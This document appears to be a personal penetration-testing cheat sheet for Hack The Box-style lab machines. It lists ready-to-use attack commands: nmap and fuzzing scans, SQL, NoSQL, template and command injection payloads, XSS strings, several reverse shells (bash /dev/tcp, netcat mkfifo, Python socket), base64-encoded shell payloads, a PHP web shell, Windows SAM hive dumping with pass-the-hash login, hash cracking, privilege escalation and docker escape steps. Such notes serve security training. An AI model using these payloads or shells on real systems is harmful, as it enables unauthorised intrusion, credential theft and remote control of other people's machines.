# SCANNING
## PORTS SCANNING
### nmap:
- `nmap -sC -sV -script vuln 10.10.10.10`
- `nmap 1.1.1.1 -p-`
- `nmap 1.1.1.1 -p 80`
- `nmap -sU 10.10.11.136`

    - `-sC` for the default scripts
    - `-sV` for Version and OS Enumeration
    - `-sU` UDP port scan
    - `-script vuln` Check for vulnerabilities using the Nmap scripting engine
    - `-p-` Port scan all ports
    - `-p` Port scan for port x

## DIRECTORIES SCANNING
### gobuster:
- `gobuster -u 10.10.10.10/ -w /usr/share/seclists/Discovery/Web-Content/common.txt dir`

    - `-s` Positive status codes (will be overwritten with status-codes-blacklist if set). Can also handle ranges like 200,300-400,404.
    - `-b` Negative status codes (will override status-codes if set). Can also handle ranges like 200,300-400,404. (default "404")

### feroxbuster:
- `feroxbuster -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web-Content/big.txt`
    - `-u` Host to scan
    - `-w` Wordlist 
    - `-k` Ignore tls

### ffuf
- `ffuf -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://2million.htb/api/v1/FUZZ`

## SUBDOMAINS SCANNING
### DNS:
#### wfuzz:
- `wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://app.microblog.htb/' -H 'Host: FUZZ.microblog.htb' --hw 11`

    - `-hw` Ignore the domains that return this number of words

### REVERSE DNS:
#### dig:
- `dig @10.10.11.166 -x 10.10.11.166`
- `dig axfr friendzone.red @10.10.10.123`

## SMB:
### smbmap:
- `smbmap -H 10.10.10.123`

### smbclient:
- `smbclient --no-pass //10.10.10.123/general`
  - `get creds.txt`
  - `put`

### SNMP:
- `snmpwalk -v 1 -c public 10.10.11.136`

# INJECTIONS
## Tools:
### BURPSUIT:
- `"Send the payloads with repeater/intruder"`
### NIKTO:
- `nikto -h 10.10.11.111 -O STATIC-COOKIE="name=value"`
    - `-h` Host to scan

### OWASP ZAP
- `owasp zap`

## SQL INJECTION(SQLi)
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [PayLoads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md)

We want to find credentials exploring possible DBs and tables. Another way is to read files.


### sqlmap:
- `sqlmap -r request.req --dbs`
- `sqlmap -r request.req -D main --tables`
- `sqlmap -r request.req -D main -T user --columns`
- `sqlmap -r request.req -D main -T user --dump`
- `sqlmap -r req.req --level=5 --risk=3 --batch --file-read=/var/www/html/index.php>`
- `sqlmap -r req.req --level=5 --risk=3 --batch --file-write=/home/kali/Downloads/Exploit/webshell.php --file-dest=/var/www/html/webshell.php`
- `sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 10 --level 5 --risk 3 --batch -D soccer_db -T accounts --dump`

    - `--dbs` Enumerate databases
    - `--tables` Enumerate DB tables
    - `--columns` Enumerate columns
    - `--dump` Get table values
    - `--level` (max 5)
    - `--risk` (max 3)
    - `--batch` Ask no questions
    - `--file-read` Path to file that we want to read from server
    - `--file-write` Path to file that we want to upload to server
    - `--file-dest` Path to location that we want to put the uploaded file

    - `-r` Request file
    - `-D` Select DB
    - `-T` Select Table

### manual:
- `admin' union select 1;-- -`
- FIND ALL DBS:
  `admin' UNION SELECT group_concat(schema_name) FROM information_schema.schemata;-- -`
- FIND TABLES IN DB:
  `admin' UNION SELECT group_concat(table_name) FROM information_schema.tables where table_schema='november';-- -`
- FIND COLUMNS IN TABLE:
  `admin' UNION SELECT group_concat(table_name, ':', column_name) FROM INFORMATION_SCHEMA.columns WHERE table_schema='november';-- -`
- FIND VALUES:
  `admin' UNION SELECT group_concat(one) FROM flag;-- -`
- READ FILES:
  `admin' UNION SELECT load_file('/var/www/html/index.php');-- -`

### manual time based:
- FIND DB NUMBER OF CHARACTERS:
- `1%20OR%20IF(LENGTH((SELECT%20database()))=5,SLEEP(1),0)%23`

## NOSQL INJECTION(NOSQLI)
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
- [PayLoads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

### manual:
```
"change content type to application/json"
{"username": {"$ne": null}, "password": {"$ne": null}}
```

- `admin' || '' === '` Bypass login page with admin as user`
- `';return 'a'=='a' && ''==' -` Extract all data

## Server Side Template Injection(SSTI)
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#constructing-a-server-side-template-injection-attack)
- [PayLoads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [PayLoads 2](https://github.com/payloadbox/ssti-payloads)
- [YouTube](https://www.youtube.com/watch?v=Ce6FGus9UYk&ab_channel=BePractical)

### Payloads:
- `${{<%[%'"}}%\.`
- `{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`
- `{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}` nodeJS

## COMMAND INJECTION
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/command-injection)
- [PayLoads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- `echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi85OTk5IDA+JjEK" | base64${IFS} -d | bash` Send the payload

## LOCAL FILE INCLUSION(LFI)
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

  - ### LFI TO RCE:
    - `https://github.com/synacktiv/php_filter_chain_generator`

### METHODS:
- `file:///etc/passwd`
- [Common Files](#COMMON-FILES-TO-TESTRETRIVE)

```
"View source code and change image directory"
`curl -k 'https://broscience.htb/includes/img.php?path=../../../../../../etc/passwd'`
```
## Server Side Request Forgery(SSRF)
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
- [PayLoads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [YouTube](https://www.youtube.com/watch?v=Zyt7lUO3mY8&ab_channel=LoiLiangYang)

### METHODS:
```
echo 'HTTP/1.1 301 Moved Permanently' >> response
echo 'Location: http://forge.htb/' >> response
echo '' >> response
echo '' >> response
nc -lvnp 8000 < response
```

## Cross-Site Request Forgery(CSRF)
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery)
- [PayLoads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection)
- [YouTube](https://www.youtube.com/watch?v=V03_7CphtHE&ab_channel=LoiLiangYang)

## Cross Site Scripting(XSS)
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
- [PayLoads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [YouTube](https://www.youtube.com/watch?v=PPzn4K2ZjfY&ab_channel=LoiLiangYang)

### DOM
his is a type of XSS attack where the vulnerability exists in the client-side code rather than the server-side code. The malicious script is embedded in the HTML page and is executed by the victim's browser when the page is loaded. This makes it more difficult to detect and prevent, as it does not involve the server at all.
One good example is search bar.

### REFLECTED  
In this type of attack, the malicious script is part of the victim's request to the website. The website includes this script in its response, which is then executed by the victim's web browser. This is often used in phishing attacks where the attacker creates a fakelogin page and sends the URL to the victim. When the victim enters their credentials, the data is sent to the attacker.
Another is to find some URL where it looks like ?q=something.

### STORED/PERSISTED
In this type of attack, the malicious script is injected into a website's database. This script is then served to the website's users when they request it, leading to the execution of the script in their web browsers. An example of a stored XSS attack is when an attacker injects a comment containing malicious code on a website, and that code is served to other users who view the comment.


- `<iframe src=\"javascript:alert('xss')\">`
- `<iframe src="javascript:alert('xss')">`
- `<iframe src='javascript:alert('xss')'>`
- `<script>document.write('<iframe src=file:///etc/passwd></iframe>');</script>`

### BLIND
- `';"</textarea></script><script/src=/bxss.hackwithnahamsec.com/` XSS Hunter
- `</textarea></script><script>alert("This is a basic alert");</script>`

## XML External Entity(XEE)
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
- [PayLoads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

## Directory Traversal
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [PayLoads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md)

## FILE UPLAOD
### BYPASSES:
- `Instead of .php, we can use .phar and use ?page=phar://uploads`

## HTTP Parameter Pollution (HPP)
HTTP Parameter Pollution (HPP) is a Web attack evasion technique that allows an attacker to craft a HTTP request in order to manipulate web logics or retrieve hidden information. This evasion technique is based on splitting an attack vector between multiple instances of a parameter with the same name (?param1=value&param1=value). As there is no formal way of parsing HTTP parameters, individual web technologies have their own unique way of parsing and reading URL parameters with the same name. Some taking the first occurrence, some taking the last occurrence, and some reading it as an array. This behavior is abused by the attacker in order to bypass pattern-based security mechanisms. 


# SHELL
## REVERSE SHELL
### OPEN:
- [Generator](https://www.revshells.com/)
- `sh -i >& /dev/tcp/10.10.14.6/9999 0>&1`
- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.12 4444 >/tmp/f` Use in files

- `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'` Python 

- `If we can execute commands on the target, we can try to create MSFVenom payload and execute it inside target`
### SEND:
- `echo 'sh -i >& /dev/tcp/10.10.14.6/9999 0>&1' | base64 ` - Convert reverse shell to base64
- `bash -c("sh -i >& /dev/tcp/10.10.14.12/4444 0>&1")` - Execute the reverse shell
- `echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjIvOTk5OSAwPiYxCg==" | base64${IFS} -d | bash` - Send the payload
## WEB SHELL
### OPEN:
- `<?php SYSTEM($_REQUEST['cmd']); ?>`
### SEND:
- `curl 10.10.11.116/shell.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.60/443 0>&1"'`
- `bash -c 'sh -i >%26 /dev/tcp/10.10.14.12/9999 0>%261'`

## LISTENING SHELL:
- `nc -lnvp 9999`

## UPGRADE SHELL:
### STABILIZE:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
"CTRL+Z"
stty raw -echo; fg
export TERM=xterm
```

### PROPER SHELL:
#### Victim
```
ssh-keygen
cd ./ssh
cat id_rsa.pub > authorized_keys
chmod 700 ~/
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_key
```
#### Host
- `nano id_rsa`
- (Copy from id_rsa victim)
- `chmod 400 id_rsa`
- `ssh -i id_rsa matt@10.10.11.136`

#### PASSPHRASE: 
```
python3 /usr/share/john/ssh2john.py id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
`john --show hash.txt`

# PORTS
## OPEN SERVER:
### PYTHON:
- `python3 -m http.server`

## PORT FORWARDING:
### SSH TUNNEL:
#### Remote machine:
- `ssh -N -f -R 3000:localhost:3000 -R 8001:localhost:8001 kali@10.10.14.119 -p 2222`

#### Local machine:
```
sudo nano /etc/ssh/sshd_config
#port 22 to port 2222
sudo service ssh start
```

```
9001 on my local machine now forwards to remote machine port 80
ssh -L 9001:localhost:80 daniel@10.10.11.136
```

```
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
ssh -L 9001:10.10.11.136:80 daniel@10.10.11.136
```
### CHISEL:
#### Remote machine:
```
./chisel client --fingerprint AsdlkipAKiomLjygJpoukjnO 10.10.10.10:8080 R:8000:10.10.10.10:8000 
```
#### Local machine:
```
8000 on my local machine now forwards to remote machine port 8000
chisel server --socks5 --reverse  
```
# BRUTE FORCING
## HASH IDENTIFIER:
### FORMAT:
- `hash-identifier`
### CRACK:
- `John The Ripper`
  - `john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt`
  - `zip2john 16162020_backup.zip > 16162020_backup.zip.john` Transforms zip file protected with password to john format


## LOGIN
### hydra:
- `hydra -l user -P passlist.txt ftp://192.168.0.1`
- `hydra -L users.txt -p password123 ftp://192.168.0.1`
   - `-l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE`
   - `-p PASS  or -P FILE  try password PASS, or load several passwords from FILE`

# PASSWORDS MANAGERS
## Passpie:
- `passpie export password.db` Exports passwords to plain text
- "download .keys to local machine"
- "remove the public key block from the file as we only need the private key"
- `gpg2john keys > keys.hash`
- `john -wordlist=/usr/share/wordlists/rockyou.txt keys.hash --format=gpg`
- `passpie export ~/password.db`
- `cat ~/password.db`

# WORDPRESS
- "search for wp-config.php"

# PROTOCOLS
## SSH
### CONNECTION:
- `ssh john@10.10.10.10 -p 22`

### DOWNLOAD FILES: (on local machine)
- `scp jnelson@10.10.11.186:/home/jnelson/.passpie/.keys ./keys`

### UPLOAD FILES: (on local machine)
- `scp chisel machine@10.10.10.10:/tmp `

## FTP
### CONNECTION:
- `ftp 10.10.11.186`

### DOWNLOAD FILES:
- `get file.txt`

# DATABASES
## POSTGRES
- `psql -h 127.0.0.1 -U postgres` - Connect DB
- `\l` - List all databases
- `\c “db”;` - Select DB
- `\dt;` - List all tables
- `Select * from users;` - Dump table data

# ROOT SHELL
- Exploit any identified vulnerabilities or misconfigurations to gain remote access to the target system.
- Use tools like Metasploit or manual exploitation techniques.
- Maintain access and establish persistence on the compromised system.

## LINUX:
### Common Files to test/retrive:
- `/etc/passwd`
- `/wp-config.php` Wordpress config
- `/etc/passwd` Users 
- `/var/www/` Folder that contains website code
- `/etc/nginx/sites-available/` Folder that contains nginx configs
- `/etc/nginx/sites-available/default` nginx Vhosts
- `/etc/apache2/sites-enabled/` Folder that contains apache2 configs
- `/etc/apache2/sites-enabled/000-default.conf` apache2 Vhosts

### LATERAL MOVEMENT
We will try to gain shell as another user. We can check home directory and /etc/passwd to check how many users exists.
#### [PORT FORWARD](#PORT-FORWARDING)

```
cat /etc/apache2/sites-enabled/
"port forward"
```

```
ss -tlpn
"port forward"
```

```
"Find abnormal files like database configs, .git, passwords managers, ..."
"One good place to find, /var/www/"
```

### PRIVILEGE ESCALATION
#### [GTFO BINS](https://gtfobins.github.io/)
##### SUDO:
- `sudo -l`

##### SUID:
- `find / -type f -perm -04000 -ls 2>/dev/null`
- `find / -perm -4000 2>/dev/null`
- `find / -group staff 2>/dev/null`
- `find / -type f -user svc_acc 2>/dev/null`

##### CAPABILITIES:
- `getcap -r / 2>/dev/null`

- ###### LXC/LXD
  - `https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation#method-2`

##### PATH:
- `ltrace pandora_backup`
- `which tar`
- `echo $PATH`
- `export PATH=/tmp:$PATH`

##### Kernel Exploits:
- `sudo -V`

### DOCKER ESCAPE
#### METHOD1: Directory from the host is mounted with read/write flag enabled
- Find Host IP:
  - `ifconfig`

- Enumerate Ports:
  - `for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done`

- SSH:
  ```
  ssh augustus@172.19.0.1`
  cp /bin/bash .
  exit
  ```

- Docker Container:
  ```
  chown root:root bash`
  chmod 4755 bash`
  ./bash -p`
  ```
## WINDOWS
```
reg save hklm\system system.bak
reg save hklm\sam sam.bak
download system.bak
download sam.bak
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
evil-winrm -i 10.10.136.177 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
```


# HACKING
## Information Gathering
- Gather information about the target organization, including email addresses, employee names, and public information.
- Use OSINT (Open-Source Intelligence) techniques to find additional attack vectors or social engineering opportunities.

## Enumeration
### [Ports Scanning](#PORTS-SCANNING)
- Use tools like Nmap to scan for open ports and services.
- Search for exploit/CVE information related to the identified services and versions.
- Enumerate services and versions using tools like banner grabbing or service-specific enumeration scripts.
- Identify weak or default credentials for services such as SSH or FTP.

#### DNS
- If a DNS port is detected (e.g., port 53):
  - [Reverse DNS](#REVERSE-DNS) to discover hidden domains.

#### SMB
- If a SMB port is detected (e.g., port 139, 445):
  - [SMB](#SMB) to find open shares.

#### Web Application Scanning
- If a website is detected (e.g., port 80, 443):
  - Use tools like Nikto and OWASP Zap to scan for potential web application vulnerabilities.
  - Conduct [Directories Scanning](#DIRECTORIES-SCANNING) to discover hidden or sensitive directories.
  - Perform [Subdomains Scanning](#SUBDOMAINS-SCANNING) using tools like wfuzz.

##### Gaining Access
###### BURPSUITE
- Explore the web application:
  - Navigate through the application, interact with forms, and explore its functionality to understand its behavior.
- View source code:
  - Inspect the HTML source code of web pages for hidden elements, comments, and potential vulnerabilities.
- Find hidden elements:
  - Check for hidden input fields, parameters, or functionality that might be accessible but not visible in the user interface.
- Identify functions:
  - Look for JavaScript functions or server-side functions that could be vulnerable to exploitation.
- Discover versions and frameworks:
  - Identify the web application's versions and underlying frameworks to search for known vulnerabilities.
- Analyze headers:
  - Examine HTTP response headers for security-related information, such as security headers or server information.
- Inspect cookies:
  - Check for cookies used by the application, especially those related to authentication and sessions.


- If a .git directory is found:
  - Explore the .git directory for sensitive information or source code, which might have been inadvertently exposed.
  - Using git-dumper can retrive us the source code.

- If web forms are present:
  - Proceed with [Injections](#INJECTIONS).

- After searching for an entry point, if there's potential for a reverse shell or protocol exploitation, proceed with [Root Shell](#ROOT-SHELL).


<!-- ###### OBJECTIVE
- Identify the target framework, software, or technology stack used by the web application.
- Search for known vulnerabilities and exploits related to the identified framework or software.
- Find secret URLs or hidden endpoints that might not be linked in the application's main interface. -->



<!-- # HACKING
- ## Enumeration:
  - ### [Ports Scanning](#PORTS-SCANNING):
    - "Search for exploit/CVE"
    - Identify open ports and services
  - If website (e.g., port 80, 443):
    - Search for version exploits
    - Subdomains Scanning / Directories Scanning (for each page)
    - Look for potential web application vulnerabilities
    ### Gaining Access:
    #### BURPSUITE:
    - Explore the web application:
      - Navigate through the application, interact with forms, and explore its functionality.
    - View source code:
      - Inspect the HTML source code of web pages for hidden elements and comments.
    - Find hidden stuff:
      - Check for hidden input fields, parameters, or functionality that might be accessible but not visible in the user interface.
    - Find functions:
      - Look for JavaScript functions or server-side functions that could be vulnerable to exploitation.
    - Find versions and frameworks:
      - Identify the web application's versions and underlying frameworks to search for known vulnerabilities.
    - Look for headers:
      - Examine HTTP response headers for security-related information.
    - Look for cookies:
      - Check for cookies used by the application, especially those related to authentication and sessions.
    - If .git directory:
      - Explore the .git directory for sensitive information or source code.
    #### OBJECTIVE:
    - Identify the target framework, software, or technology stack.
    - Search for known vulnerabilities and exploits related to the identified framework or software.
    - Find secret URLs or hidden endpoints that might not be linked in the application's main interface.
    - If web forms are present, proceed with [Injections](#INJECTIONS).
    - If potential for reverse shell or protocol exploitation:
      - Proceed with [Root Shell](#ROOT-SHELL). -->
